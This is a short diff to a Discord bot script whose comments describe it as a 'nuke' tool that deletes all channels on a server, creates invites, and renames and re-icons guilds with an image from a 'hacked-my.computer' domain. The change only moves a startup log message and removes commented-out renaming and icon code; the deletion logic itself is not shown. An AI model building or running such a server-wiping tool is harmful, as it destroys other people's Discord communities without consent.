@@ -5,6 +5,10 @@ const fs = require("fs")
 
 //on ready 
 client.on("ready", () => {
+
+    //startup message 
+    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
+
     // create variable for new channel to prevent it from getting deleted by nuke
     let createdChannelName;
     // Create an invite to a channel
@@ -24,11 +28,7 @@ client.on("ready", () => {
             if (err) throw err;
         });
     });
-/*
-    client.guilds.setName('Name')
-    .then(g => console.log(`Updated guild name to ${g}`))
-    .catch(console.error);
-*/
+
 
 
 //delete all channels on server
@@ -62,20 +62,6 @@ client.guilds.forEach(guild => {
     });
 });
 */
-
-    //startup message 
-    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
-
-
-
-    /*
-    //set server icon
-    guild.setIcon("https://china.hacked-my.computer/95314b55.png");
-
-    //set server name
-    guild.setName("name");
-    */
-
 
     //handle unexpected errors
     process.on("uncaughtException", err => {
